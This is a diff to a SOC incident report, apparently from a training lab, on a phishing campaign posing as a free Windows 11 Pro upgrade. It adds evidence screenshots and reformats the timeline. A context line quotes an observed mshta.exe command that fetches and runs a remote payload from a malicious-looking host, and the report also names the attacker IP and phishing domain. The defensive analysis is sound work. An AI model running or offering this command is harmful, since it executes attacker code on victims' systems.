@@ -20,6 +20,7 @@ Correlation between email telemetry, browser history, endpoint activity, network
 - Subject |	Upgrade your system to Windows 11 Pro for FREE
 - Action	| Allowed
 
+![Test Image](../Evidence/Alert_Phishing.png)
 
 ## Investigation Methodology
   
@@ -42,6 +43,8 @@ The source IP address: 132.232.40.201
 - Investigation revealed that the user accessed the following website: windows-update.site
 
 - This confirmed direct interaction with the phishing campaign.
+
+![Test Image](../Evidence/Site_Visited.png)
 
 ### 4. PowerShell Analysis
 
@@ -95,16 +98,18 @@ Commands Observed
 
 - mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
 
+![Test Image](../Evidence/Command_exec.png)
+
 ### Incident Timeline
 
-Time |	Event
-09:44 AM |	Phishing email received
-Later	User accessed windows-update.site
-Later	Obfuscated PowerShell executed
-Later	mshta.exe launched
-Later	Remote payload retrieval observed
-Later	SOC338 alert generated
-Later	Investigation completed and escalated
+- Time |	Event
+- 09:44 AM |	Phishing email received
+- Later	User accessed windows-update.site
+- ater	Obfuscated PowerShell executed
+- Later	mshta.exe launched
+- Later	Remote payload retrieval observed
+- Later	SOC338 alert generated
+- Later	Investigation completed and escalated
 
 ### MITRE ATT&CK Mapping
 
